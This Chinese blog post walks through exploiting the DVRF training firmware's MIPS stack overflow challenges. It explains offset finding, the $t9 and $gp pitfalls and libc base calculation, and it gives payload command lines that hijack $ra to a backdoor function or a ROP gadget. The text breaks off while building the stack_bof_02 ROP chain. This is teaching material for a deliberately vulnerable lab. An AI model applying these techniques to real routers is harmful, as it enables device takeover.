#  MIPS栈溢出漏洞实战解析：从DVRF题目看ROP链构造   
原创 秋名山上的小柠  蚁景网络安全   2025-04-21 09:29  
  
## 前言  
  
最近导师要搞IOT漏洞挖掘项目，我得找找IOT学习资料，DVRF就适合IOT设备漏洞挖掘从入门到入坟….（bushi  
## 固件分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKQceeTn4CtupgzSew0o8P7eZMI7ZkwiapZk6kKDibGjwZJK6qGrpEES5g/640?wx_fmt=png&from=appmsg "")  
  
Squashfs系统，还是小端序，提取一下文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKyubpUDHW6P0yzicdueAhaLic31hptlkCheM9iaOdpdicENiasickUqh2q5pQ/640?wx_fmt=png&from=appmsg "")  
  
有漏洞的程序在pwnable目录下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKANSFW94mRNtRqFeVVXXW1d040Br7Wz7icj1AamyuaYqQPRUribzK2Wow/640?wx_fmt=png&from=appmsg "")  
  
不过DVRF里面还附带有程序的源码，所以我们先看看源码，再来看二进制程序  
## 题目  
### stack_bof_01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKRic1icnqU2j2aUSbGEg4rCYJef6MibosccM4tE3ykzNQ1CHW0JMTvtVeQ/640?wx_fmt=png&from=appmsg "")  
###   
  
乍一看，strcpy()和system()都有，buff叠满了，细一看system()函数是固定字符串，应该不会造成命令注入漏洞，因为已经把控制参数都给写好了（什么地狱笑话），直接留了个后门，所以只剩下strcpy()这个常见的栈溢出漏洞函数，没有对输入的内容限制长度，所以有栈溢出。buf一共200字节长度，只要argv[]这个我们可控的参数长度超过200就可以覆盖掉buf，然后劫持函数执行流到system(“/bin/sh -c”)这个后门函数即可  
  
先checksec检查二进制文件信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKB8QmDYrZcDibG0bo170Jo4VrLP7umzkY7BcjFJvQuBlMfTHoEGx2CIQ/640?wx_fmt=png&from=appmsg "")  
  
  
什么都没有，城门大开，并且是mips32位小端序，所以要模拟起来的话，需要qemu-mipsel，考虑到动态链接经常出幺蛾子，所以直接搞个静态的，即qemu-mipsel-static到固件的根目录下，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK5ITxRibCITdllGKF7Mq6sV5QDgjQQ71ORGcJoswiaKmJrBm9KU70CQ1A/640?wx_fmt=png&from=appmsg "")  
  
然后开启模拟  
```
sudo chroot ../qemu-mipsel-static ./pwnable/Intro/statck_bof_01
```  
  
一开始以为显示的是缺少参数东西，检查了好久检查不出个所以然，后来才反应过来这是要在后面输入东西，然后就看见模拟成功跑起来了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKXIqcdczxCDPWQrbwIhqKj66ZjDo8nmamcl4d9C4ic4DPv1NMaCnUQ3w/640?wx_fmt=png&from=appmsg "")  
  
那接下来我们需要得到一个偏移量，即argv[]参数到寄存器R31也就是$ra的偏移量，要么静态IDA查看计算一番，不过有可能会不准，所以直接一劳永逸用动态调试来计算好了  
  
首先开启一个端口8888  
```
sudo chroot ../qemu-mipsel-static -g 8888./pwnable/Intro/statck_bof_01
```  
  
然后另起一个窗口，开启动态调试  
```
gdb-multiarch stack_bof_01 
set architecture mips
target remote 127.0.0.1:8888
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKmSlibufQDiaB2XEPOFVK5Z8WicXsaUwAQErRbTzq5npaCrRuocwhCOdOw/640?wx_fmt=png&from=appmsg "")  
  
  
进来pwndbg初始状态  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKN2rMQYmia3gK1Bl5k2gDic0A9SDW7uQBn2WyvzMq2NQ93CBBDQ0p9HPg/640?wx_fmt=png&from=appmsg "")  
  
  
由于一开始已经在main函数里，所以直接n单步步过到strcpy函数，按理说这个流程应该没错，但是不知道是不是pwndbg自身的问题，一直报错  
  
排查了一天也不知道怎么解决，后来网上找了一个黑盒测试的方法  
  
主要用于 **调试 MIPS 架构的缓冲区溢出漏洞**  
```
ulimit -c unlimited  #启用核心转储（core dump）功能，并解除大小限制,当程序崩溃，比如说段错误时，系统会生成一个 core 文件，记录崩溃时的内存状态，如寄存器、堆栈等 此命令确保 core 文件能被完整生成
sudo bash -c 'echo %e.core.%p > /proc/sys/kernel/core_pattern'#设置核心转储文件的命名格式，方便后续调试时快速定位对应的崩溃文件
sudo chroot ../qemu-mipsel-static  ./pwnable/Intro/stack_bof_01 `cyclic 1000`#在 chroot 环境中，使用 QEMU 用户态模拟器运行 MIPS 小端序程序，并触发崩溃，程序因缓冲区溢出崩溃，生成 core 文件
sudo gdb-multiarch ./pwnable/Intro/stack_bof_01 ./qemu_stack_bof_01_20250406-074606_5214.core -q #使用支持多架构的 GDB 加载程序及其核心转储文件进行调试，查看崩溃时的寄存器状态，比如说$pc 的值，确定溢出点偏移量
cyclic -l 0x63616162#通过崩溃时覆盖的地址，这里是0x63616162，反推溢出点偏移量 cyclic 工具生成一个 唯一递增的 4 字节模式字符串 比如说aaaabaaacaaadaaa...当程序崩溃时，若寄存器的值是 0x63616162（对应 ASCII baac，注意小端序），则执行cyclic -l 0x63616162 该值在模式字符串中的偏移量，即溢出点到返回地址的偏移
```  
  
说白了，整个调试模式流程如下：  
1. **生成崩溃**  
：通过 cyclic  
 字符串触发程序崩溃，生成 core  
 文件  
  
1. **定位偏移**  
：用 cyclic -l <地址>  
 计算偏移量  
  
1. **构造 Payload**  
：根据偏移量构造 填充数据 + 目标地址  
 的利用载荷  
  
1. **重新触发**  
：用构造的 Payload 替换 cyclic  
 字符串，验证漏洞利用  
  
学到了学到了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKibB0OQohRP5JWBMQkxicOwwkjb0Ih9BuIqZ2Ikt93EDKvjAJyxwCf34Q/640?wx_fmt=png&from=appmsg "")  
  
  
所以我们得到了偏移204的位置覆盖了返回地址，所以我们要先覆盖204个字节长度(这里不用再加上4个字节长度的寄存器了，因为204就已经包括了寄存器了)，然后再加上程序自己留的后门函数system(“/bin/sh -c”)的地址，就可以完成一次攻击劫持流  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKibD6qbw5BnEluVJE8BcLchsZv5lQplYvibYyCLqW5u2JK3zL3OltqkgA/640?wx_fmt=png&from=appmsg "")  
  
  
由IDA可知，后门函数地址为0x00400950，**并且要注意这里是小端序的写法**  
，所以payload为  
```
sudo chroot ././qemu-mipsel-static -g 1234./pwnable/Intro/stack_bof_01 `python -c 'print(b"a"*204 + b"\x50\x09\x40\x00")'`
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKgiaY8wNPl9eOx3xHXfPtR7xrKe83Ssia0ycRh3WGhmTb9rSHFkRXbZrg/640?wx_fmt=png&from=appmsg "")  
  
  
由于pwndbg动态调试的时候出现异常，所以这里改为用IDA进行远程动态调试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKew7ZSsJUacTHIIY0fbYic6mibmgyzIUSoMDnm36DRJXibXaSIr6iaXeg7A/640?wx_fmt=png&from=appmsg "")  
  
不出意外崩了，毫不意外呢….  
  
根据技术文档分析，程序崩溃的根源与MIPS架构特性直接相关  
  
在缓冲区溢出攻击场景中，**全局指针寄存器$gp被覆盖是触发异常的核心因素**  
。该寄存器负责维护全局数据区的基址定位，其值被破坏后，程序无法通过偏移计算正确访问全局变量或静态存储区，最终因寻址错误，比如说访问非法内存地址，导致崩溃  
  
进一步结合漏洞利用流程，MIPS的函数执行机制要求**$t9寄存器必须指向当前函数的入口地址**  
，这是指令集中对函数跳转和数据索引的硬性规范。例如，调用dat_shell  
函数时，若$t9  
未正确指向其起始地址，代码将无法解析函数内的相对偏移，进而引发执行流紊乱  
  
t9 寄存器总是保存的是函数的开头地址，若通过控制 ra 直接劫持到目标函数，**t9 寄存器没有变化，还是原来调用过的函数的地址**  
  
所以需要调用 ROP 来设置一次 t9 寄存器的地址为后门地址，**进而 jr $t9，才能使得 gp 寄存器正确的寻址**  
  
而且这里不能用 python -c 命令作为命令行参数传进去，**因为在 python 输出过程中会被截断**  
  
因此，完整的利用链需分两步完成：首先通过**ROP gadget精准设置$t9寄存器的值**  
，使其符合目标函数dat_shell  
的入口地址，再通过控制流劫持跳转至目标函数，从而绕过MIPS架构的寄存器约束，实现稳定攻击  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKUJT9THAUhw8SqgicWfUDpxUaYYaukUGUHoDccy6ah9XYzqic5FCRgrCw/640?wx_fmt=png&from=appmsg "")  
  
  
所以现在首要目标就是要找到一个gadgets，可以跳转到$t9  
寄存器，然后修改返回地址到 rop_gadget  
, 设置 $t9  
 为 dat_shell  
 函数的地址，跳转到 dat_shell  
 函数，执行system  
，在原程序中没有找到跳转到$t9  
的gadget  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKn7gVMXeDxLh9XyDsHBObiaItu8sP0O1HTnloItNeghqDuLeiauama0Rg/640?wx_fmt=png&from=appmsg "")  
  
  
在DVRF固件所提供的文件libc.so.0中刚好能找到我们想要的gadget  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKL59XudWpfQmNZtnhvzyIlYnax577387VcialhxuJ0gBicI8Cf1bxXX0Q/640?wx_fmt=png&from=appmsg "")  
  
但是这不是真正的地址，我们得去找到libc的基地址再加上0x6b20才是我们所以填写到payload中的地址  
  
所以现在问题又变成了怎么找到libc的基地址，因为从ida来看，并没有@plt表，所以通过泄露一些在程序中已被调用的函数的地址，通过其在程序运行起来的地址减去在libc.so.0内的地址从而得到libc的基地址  
  
那我们就用这个第一个的memset函数，在libc.so.0的地址为0001BE10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKu8icxMSwbibKSOtMxIFyrOFArBbQ0msxSKp1cXgVRSPD7cFHwibMnCfMw/640?wx_fmt=png&from=appmsg "")  
  
  
ida在memset下个断点，然后远程动态调试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK4GBzJCUGzNu7mh3d8FmI5V8x745cHhJvsJLLHUEc6psiazWuBSFXw1Q/640?wx_fmt=png&from=appmsg "")  
  
  
找到memset在执行的时候的真正地址，为0x7F700E10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKbO2ltuYBnAbVel6zInibnuMCApNODItwD12CpIianDt1Lqjwxul0GrQA/640?wx_fmt=png&from=appmsg "")  
  
  
libc_base=0x7F700E10-0x0001be10=0x7f6e5000  
  
gadget地址为=0x7f6e5000+0x6b20=0x7F6EBB20  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKnxoHbcAoJTpkBiaqvXC3hkkicWib5CuzYUzyyBCqPpP8nqdo658Gm6ACg/640?wx_fmt=png&from=appmsg "")  
  
```
sudo chroot ../qemu-mipsel-static ./pwnable/Intro/stack_bof_01 "$(python -c "print 'A'*204+'\x20\xbb\x6e\x7f\x50\x09\x40\x00'")"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKJwGfaAT8v2faS0QECHmIWcc8RaAdQdZ1MyFxBJ3XNhIdonTnVQnvkQ/640?wx_fmt=png&from=appmsg "")  
  
我看网上还有一种方法，因为dat_shell的首地址在0x00400950，但是直接跳过去的话又会发生崩溃，所以在0x00400950处下一个断点，看看到底咋回事  
  
可以看到经过三次单步步过之后，gp寄存器指向了一块不知名且无法访问的内存空间  
  
而gp寄存器在MIPS中$gp  
是 **全局指针寄存器**  
，用于高效访问静态数据区，比如说全局变量、常量等  
  
程序启动时，$gp  
 由运行时环境，比如说启动代码设置为指向 .got  
或数据段中间位置。  
  
当$gp  
指向了一块不知名且无法访问的内存区域时，通常意味着程序在初始化、链接或运行时逻辑中存在严重问题，也有可能时$gp  
 本应在程序生命周期内保持恒定，但若代码中错误地修改了 $gp  
，比如说如误将其用作临时寄存器），会导致后续全局数据访问失败  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKrSEl5icsicv3Bdic9f2sF6rZYLt41DmnUkwzazYZmOsCrneib4niaoNjcWw/640?wx_fmt=png&from=appmsg "")  
  
总之既然直接跳转到0x00400950会发生错误，那根据上述的调试可知，只要绕过前面三步单步步过就可以了，所以把payload地址修改为0x0040095c  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKsTwL05x0E3hLwe5iccXicLHibR7NOoPhwngFdIsG5pfW3J4Q1tZYYzRQg/640?wx_fmt=png&from=appmsg "")  
```
sudo chroot ../qemu-mipsel-static ./pwnable/Intro/stack_bof_01 "$(python -c "print 'A'*204+'\x5c\x09\x40\x00'")"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK6NsmvqWMzDFWuU9SPOeWO2ne2T60ZT3lnm5IMPob2vTqJr3S6d96Jg/640?wx_fmt=png&from=appmsg "")  
  
又get一种黑科技写法  
  
这道题最重要的就是学到**$t9寄存器的值是MIPS程序的函数的起始地址**  
，这对rop链构造是至关重要的  
### stack_bof_02  
  
先看源码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK1ibzVTQEfhu3rdhiaopoBF62g7D7iarjBF2wgTUzUVuGajOdUJR0eticIA/640?wx_fmt=png&from=appmsg "")  
  
这一漏洞的本质仍属于典型的栈溢出攻击场景  
  
程序通过命令行参数获取输入数据，在利用strcpy  
函数进行数据复制时，由于未对参数长度进行有效性校验，导致超出目标缓冲区的容量边界，从而引发栈空间溢出  
  
而且，根据《揭秘家用路由器0day漏洞挖掘技术》书中所写到，main  
函数在MIPS架构中被归类为**非叶子函数**  
，这意味着其栈帧中会保存返回地址寄存器$ra  
  
当溢出发生时，就可以通过构造的输入数据覆盖栈上存储的$ra  
值，当main  
函数执行完毕并尝试通过jr $ra  
返回时，程序流将被劫持到被篡改的地址  
  
不过跟上一道相比，少了后门函数  
  
因此，我们需要通过注入**Shellcode**  
到栈或寄存器中，并将$ra  
覆盖为Shellcode的起始地址，从而在程序返回时触发攻击代码的执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK3xP4Cw1GBmJ71QXCy0Klqiacrx4tosrxuGyb2lZ3gdsNBHK8tQYib74g/640?wx_fmt=png&from=appmsg "")  
  
检查一下文件，发现啥保护都没有，32小端序  
  
模拟，启动！  
```
sudo chroot ../qemu-mipsel-static ./pwnable/ShellCode_Required/stack_bof_02
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK2RplmFnno5YvWrPN94tHu39s6wDGsyoeiaKlULKek63E6r4K4JJVFUg/640?wx_fmt=png&from=appmsg "")  
  
这已经明示了要弄shellcode了  
  
动态调试还是不行啊…搞不定，用用黑盒测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK7YYO19TtC6XxTnFya9CEHBSEDpMgndicJdibDrqwrTzCNkCzZ11naoibQ/640?wx_fmt=png&from=appmsg "")  
  
  
要覆盖508个字节长度  
  
准备构造ROP  
  
由于MIPS采用**流水线指令集架构**  
，其存在**cache incoherency**  
特性，因此在跳转到shellcode之前必须调用**sleep等函数**  
将数据区刷新至当前指令区，这样才能保证shellcode的正常执行  
> 流水线指令集架构  
  
  
是一种通过并行化处理指令执行过程来提高处理器效率的设计方法。其核心思想是将指令的执行过程划分为多个独立的阶段  
  
比如说取指、译码、执行、访存、写回等  
  
每个阶段由专门的硬件单元处理，不同阶段的指令可以同时执行，从而形成类似“工厂流水线”的工作模式  
  
典型的流水线分为以下阶段（以经典5级流水线为例）：  
- **取指（IF）**  
：从内存中读取指令。  
  
- **译码（ID）**  
：解析指令的操作码和操作数。  
  
- **执行（EX）**  
：执行算术或逻辑运算。  
  
- **访存（MEM）**  
：访问内存（如加载或存储数据）。  
  
- **写回（WB）**  
：将结果写回寄存器。  
  
每个阶段完成后，指令会传递到下一阶段，同时新的指令进入当前阶段。例如：  
- 第1条指令处于**写回**  
阶段时，  
  
- 第2条指令可能处于**访存**  
阶段，  
  
- 第3条指令处于**执行**  
阶段，  
  
- …  
  
举个例子  
```
ADD R1, R2, R3 #R1 = R2 + R3，算术运算
LW R4,0(R1)#从内存地址R1+0加载数据到R4，访存操作
SUB R5, R4, R6 # R5 = R4 - R6，依赖第2条指令的R4结果
BEQ R5, R0, LABEL #若R5 == 0，跳转到LABEL，分支指令
```  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">周期</span></section></th><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">IF（取指）</span></section></th><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">ID（译码）</span></section></th><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">EX（执行）</span></section></th><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">MEM（访存）</span></section></th><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">WB（写回）</span></section></th><th style="box-sizing: border-box;text-align: center;padding: 6px 13px;font-weight: 700;border: 1px solid rgb(221, 221, 221);"><section><span leaf="">关键现象说明</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">1</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">ADD</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">开始取第一条指令</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">2</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LW</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">ADD</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">ADD进入译码，LW开始取指</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">3</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">SUB</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LW</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">ADD</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">ADD执行，LW译码，SUB取指</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">4</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">BEQ</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">SUB</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LW</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">ADD</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">ADD完成EX，结果旁路给LW的访存地址</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">5</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">NOP（停顿）</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">BEQ</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">SUB</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LW</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">ADD</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">LW访存，SUB需等待R4结果，流水线停顿1周期</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">6</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LABEL指令</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">NOP</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">BEQ</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">SUB</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LW</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">BEQ执行分支判断，SUB完成EX</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">7</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LABEL指令</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">NOP</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">BEQ</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">SUB</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">分支预测失败，清空流水线（若R5≠0则继续执行）</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);border-top: 1px solid rgb(204, 204, 204);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">8</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">-</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">LABEL指令</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">NOP</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><strong style="box-sizing: border-box;font-weight: 700;"><span leaf="">BEQ</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(221, 221, 221);text-align: center;"><section><span leaf="">恢复执行后续指令</span></section></td></tr></tbody></table>  
所以，我们需要在跳转前调用 sleep(1)  
 刷新指令缓存，而sleep函数将参数存放在$a0寄存器中，所以我们在libc.so.0中寻找我们所要的gadget  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKDfMyDyFQ5qLcNheDficXl9KDpOKtZtHavSQJsATqrRvqpt38k2fOtkA/640?wx_fmt=png&from=appmsg "")  
  
  
随便选一个了，选了第二个，且gadget的末尾是跳转到$s1寄存器，先到0x0002fb10地址查看一番  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKFcAbn5ZQBaIiaU8ZHDzwCr8kuClq2BWCNvKib1icYWoIfp641eA9alJhg/640?wx_fmt=png&from=appmsg "")  
  
由图所示，我们还要找到可以控制$s1的gadget，以便覆盖数据的时候可以覆盖掉$s1寄存器  
  
但是在main函数中没有出现类似 lw $s0, offset($sp)  
 的指令，意味着该函数未主动恢复保存寄存器（$s0−$s7）的值  
  
